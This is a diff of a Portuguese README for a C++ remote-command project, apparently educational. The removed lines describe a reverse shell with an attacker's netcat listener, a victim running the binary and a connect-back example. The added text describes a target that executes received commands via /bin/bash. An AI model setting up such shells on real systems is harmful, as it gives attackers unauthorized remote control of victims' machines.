@@ -1,10 +1,9 @@
-# CPP Reverse Shell
+# CPP Remote Shell
 
-[![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 [![GitHub Issues](https://img.shields.io/github/issues/ZXyoukai/CPP-reverse-shell.svg)](https://github.com/ZXyoukai/CPP-reverse-shell/issues)
 
-Bem-vindo ao **CPP Reverse Shell**!  
-Este projeto demonstra como implementar uma reverse shell em C++ para fins educacionais e de pesquisa.
+Bem-vindo ao **CPP Remote Shell**!  
+Este projeto demonstra como implementar um sistema de execução remota de comandos em C++ utilizando sockets, composto por um cliente e um servidor (target).
 
 ⚠️ **Atenção:** Use este código apenas em ambientes controlados e para aprendizado. O uso indevido pode ser ilegal.
 
@@ -12,11 +11,16 @@ Este projeto demonstra como implementar uma reverse shell em C++ para fins educa
 
 ## 🚀 Como funciona?
 
-Uma reverse shell conecta-se de volta a um servidor controlado pelo atacante, permitindo a execução remota de comandos.  
-**Exemplo de fluxo:**
-1. O atacante inicia um listener (`nc -lvnp 4444`)
-2. A vítima executa o binário da reverse shell
-3. O atacante recebe acesso remoto ao terminal da vítima
+Este projeto implementa um sistema cliente-servidor para execução remota de comandos:  
+**Arquitetura:**
+- **Target (Servidor):** Escuta na porta 8080 e aguarda conexões
+- **Client (Cliente):** Conecta-se ao target e envia comandos para execução
+
+**Fluxo de execução:**
+1. O target é executado e fica escutando na porta 8080
+2. O client conecta-se ao target
+3. O usuário digita comandos no client que são enviados ao target
+4. O target executa os comandos usando `/bin/bash` e retorna a saída
 
 ---
 
@@ -30,19 +34,40 @@ cd CPP-reverse-shell
 
 ### 2. Compile o projeto
 ```bash
-g++ -o reverse_shell reverse_shell.cpp
+make
 ```
+Isso criará dois executáveis: `client` e `target`
 
-### 3. Execute o listener no seu servidor
+### 3. Execute o target (servidor)
 ```bash
-c -lvnp 4444
+./target
 ```
+O target ficará escutando na porta 8080
 
-### 4. Execute a reverse shell na máquina alvo
+### 4. Execute o client (em outro terminal)
 ```bash
-./reverse_shell <IP_DO_SERVIDOR> <PORTA>
+./client
 ```
-> Exemplo: `./reverse_shell 192.168.1.10 4444`
+O client se conectará automaticamente ao target em `127.0.0.1:8080`
+
+### 5. Digite comandos no client
+Você pode digitar qualquer comando que será executado no target:
+```
+$ ls -la
+$ pwd  
+$ whoami
+```
+Digite `exit` ou `quit` para encerrar a conexão.
+
+## 📋 Estrutura do Projeto
+
+```
+CPP-reverse-shell/
+├── client.cpp    # Cliente que se conecta ao target
+├── target.cpp    # Servidor que executa comandos
+├── makefile      # Arquivo para compilação
+└── README.md     # Este arquivo
+```
 
 ---
 
@@ -57,14 +82,8 @@ Quer melhorar este projeto?
 
 ## 🔍 Referências
 
-- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [Documentação C++ Sockets](https://www.cplusplus.com/reference/cstdio/)
-
----
-
-## 📜 Licença
-
-Distribuído sob a licença MIT. Veja o arquivo `LICENSE` para mais informações.
+- [Socket Programming in C++](https://www.geeksforgeeks.org/socket-programming-cc/)
+- [Linux System Calls](https://man7.org/linux/man-pages/man2/socket.2.html)
 
 ---
 
